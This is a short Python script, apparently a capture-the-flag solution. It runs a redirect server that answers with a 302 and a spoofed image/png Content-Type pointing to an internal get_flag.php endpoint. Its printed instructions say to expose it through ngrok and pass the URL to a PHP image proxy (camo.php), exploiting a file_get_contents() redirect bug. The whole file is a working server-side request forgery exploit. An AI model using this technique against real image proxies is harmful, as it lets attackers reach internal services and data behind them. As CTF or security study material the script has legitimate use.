#!/usr/bin/env python3
"""
Simple HTTP server that redirects with image Content-Type
This exploits the PHP file_get_contents() redirect header bug
"""

from http.server import HTTPServer, BaseHTTPRequestHandler

class RedirectHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        # Send 302 redirect with image content type
        self.send_response(302)
        self.send_header('Content-Type', 'image/png')
        self.send_header('Location', 'http://127.0.0.1/get_flag.php')
        self.end_headers()
        print(f"[+] Redirected request from {self.client_address[0]}")
    
    def log_message(self, format, *args):
        return  # Suppress default logging

if __name__ == '__main__':
    PORT = 8080
    server = HTTPServer(('0.0.0.0', PORT), RedirectHandler)
    print(f"[+] Redirect server running on port {PORT}")
    print(f"[+] This server will:")
    print(f"    - Return HTTP 302 redirect")
    print(f"    - Set Content-Type: image/png")
    print(f"    - Redirect to: http://127.0.0.1/get_flag.php")
    print(f"\n[+] Expose this with ngrok: ngrok http {PORT}")
    print(f"[+] Then use: http://YOUR_NGROK_URL in camo.php")
    server.serve_forever()
